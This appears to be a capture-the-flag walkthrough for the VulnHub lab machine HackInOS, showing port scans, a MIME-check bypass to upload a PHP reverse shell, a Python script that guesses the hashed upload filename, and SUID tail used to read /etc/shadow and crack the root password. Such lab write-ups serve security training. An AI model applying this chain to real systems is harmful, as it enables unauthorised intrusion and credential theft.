@@ -1,0 +1,150 @@
+https://www.vulnhub.com/media/img/entry/HackInOS-00-crop.png
+
+## nmap -p- 192.168.0.52
+	PORT     STATE SERVICE
+	22/tcp   open  ssh
+	8000/tcp open  http-alt
+
+Full TCP port scan gives us 2 open ports 22/tcp & 8000/tcp
+
+After doing nmap -p 8000 -sV -sC -A we get very intresting informations
+
+	PORT     STATE SERVICE VERSION
+	8000/tcp open  http    Apache httpd 2.4.25 ((Debian))
+	|_http-generator: WordPress 5.0.3
+	|_http-open-proxy: Proxy might be redirecting requests
+	| http-robots.txt: 2 disallowed entries 
+	|_/upload.php /uploads
+	|_http-server-header: Apache/2.4.25 (Debian)
+	|_http-title: Blog &#8211; Just another WordPress site
+
+=> On port 8000 ther is wordpress is running and 2 disallowed entries /upload.php /uploads
+
+first check for Wordpress
+
+## curl http://192.168.0.52:8000
+	<h1 class="site-title"><a href="http://localhost:8000/" rel="home">Blog</a></h1>
+
+This result shows that we need to visit with http://localhost:8000/
+
+So we need to add an entry into the /etc/hosts as follows
+
+	192.168.0.52	localhost
+
+http://localhost:8000/upload.php give us an upload page but /uploads/ give us Forbidden
+
+## dirb http://localhost:8000/uploads/ give us nothing
+
+So we can upload image file but we cant find our file, as dirb also fails to find our file 
+
+After doning inspect element on /upload.php we get a hint
+
+<!-- https://github.com/fatihhcelik/Vulnerable-Machine---Hint -->
+
+In the github page we found our uploads.php page (source code), Thanks for that
+
+After inspecting code written inside the uploads.php, I found somthing intresting
+
+	$rand_number = rand(1,100);
+	
+	$target_dir = "uploads/";
+	
+	$target_file = $target_dir . md5(basename($_FILES["file"]["name"].$rand_number));
+	
+	$file_name = $target_dir . basename($_FILES["file"]["name"]);
+	
+	$imageFileType = strtolower(pathinfo($file_name,PATHINFO_EXTENSION));
+	if($check["mime"] == "image/png" || $check["mime"] == "image/gif"){
+		$uploadOk = 1;
+
+* First we have to bypass mime type check by adding GIF98 at the above of our php reverse shell code that is esay.
+* after uploading our "shell.php" with bypassed mime type filter we have figure out where it goes the file is uploades indside /uploads/
+	but still we cant execute our file.
+
+* $target_file = $target_dir . md5(basename($_FILES["file"]["name"].$rand_number));
+	this code add a randome between 1 to 100 after our file and genrate MD5 of it.
+	The genrated md5 is the new name of our file
+	but good thing is the it doesn't change our file extention
+
+I made a python code to genrate list of possible file name
+
+Posible_name_gen.py
+
+	import hashlib
+	for i in range(1,101):
+		word = 'shell.php'+ str(i)
+		md5 = hashlib.md5(word.encode()).hexdigest()
+		print(md5)
+
+## python3 Posible_name_gen.py >> posible_file_names
+	above command genrats posibble_file_names list
+
+## dirb http://localhost:8000/uploads/ posible_file_names -X .php
+
+		GENERATED WORDS: 100                                                           
+
+	---- Scanning URL: http://localhost:8000/uploads/ ----
+	+ http://localhost:8000/uploads/9025432ce6ebed53652f3ce0f3b00040.php (CODE:200|SIZE:272)	
+
+dirb found our revese shell file 
+
+now start nc listner
+
+##
+
+and wola we get our connection
+
+after enumerating suid bits 
+##www-data@1afdd1f6b82c:/$ find / -perm -4000 -ls 2>/dev/null
+	find / -perm -4000 -ls 2>/dev/null
+   170092     40 -rwsr-xr-x   1 root     root        40504 May 17  2017 /usr/bin/chsh
+   170137     76 -rwsr-xr-x   1 root     root        75792 May 17  2017 /usr/bin/gpasswd
+   170190     60 -rwsr-xr-x   1 root     root        59680 May 17  2017 /usr/bin/passwd
+   170180     40 -rwsr-xr-x   1 root     root        40312 May 17  2017 /usr/bin/newgrp
+   170237     68 -rwsr-xr-x   1 root     root        68584 Feb 22  2017 /usr/bin/tail   <=
+   170090     52 -rwsr-xr-x   1 root     root        50040 May 17  2017 /usr/bin/chfn
+   148362     44 -rwsr-xr-x   1 root     root        44304 Mar  7  2018 /bin/mount
+   169578     32 -rwsr-xr-x   1 root     root        31720 Mar  7  2018 /bin/umount
+   169562     40 -rwsr-xr-x   1 root     root        40536 May 17  2017 /bin/su
+
+
+We get /usr/bin/tail as suid bit enable
+so we can tail any file in the pc 
+
+lets tail /etc/shadow
+
+##/usr/bin/tail /etc/shadow -n 100
+	root:$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/:17951:0:99999:7:::
+	daemon:*:17931:0:99999:7:::
+	bin:*:17931:0:99999:7:::
+	sys:*:17931:0:99999:7:::
+	sync:*:17931:0:99999:7:::
+	games:*:17931:0:99999:7:::
+	man:*:17931:0:99999:7:::
+	lp:*:17931:0:99999:7:::
+	mail:*:17931:0:99999:7:::
+	news:*:17931:0:99999:7:::
+	uucp:*:17931:0:99999:7:::
+	proxy:*:17931:0:99999:7:::
+	www-data:*:17931:0:99999:7:::
+	backup:*:17931:0:99999:7:::
+	list:*:17931:0:99999:7:::
+	irc:*:17931:0:99999:7:::
+	gnats:*:17931:0:99999:7:::
+	nobody:*:17931:0:99999:7:::
+	_apt:*:17931:0:99999:7:::
+
+we get root hash
+
+After cracking root shadow hash we get 
+we found root password is john
+
+let login with 
+name root
+password john
+
+we are root now and found our flag
+
+root@1afdd1f6b82c:~# cat flag
+cat flag
+Life consists of details..  
